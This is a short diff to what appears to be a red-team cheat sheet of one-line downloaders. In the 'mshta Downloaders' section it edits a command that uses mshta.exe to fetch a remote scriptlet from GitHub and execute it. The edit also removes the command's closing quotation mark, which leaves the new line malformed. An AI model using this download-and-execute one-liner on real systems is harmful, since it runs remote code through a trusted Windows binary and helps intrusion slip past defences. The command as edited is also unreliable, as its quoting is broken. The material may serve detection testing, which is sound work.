@@ -2151,10 +2151,7 @@ This section contains onelinner crandle downloaders that for one reason or anoth
 <br /><br />
 **mshta Downloaders**<br />
 
-      cmd /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"
-
-      
-![ComDownloader](https://user-images.githubusercontent.com/23490060/96273174-f3040400-0fc6-11eb-82df-40cc1e60b229.png)
+      cmd /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()
 
 <br /><br />
 **Python Downloaders**<br />
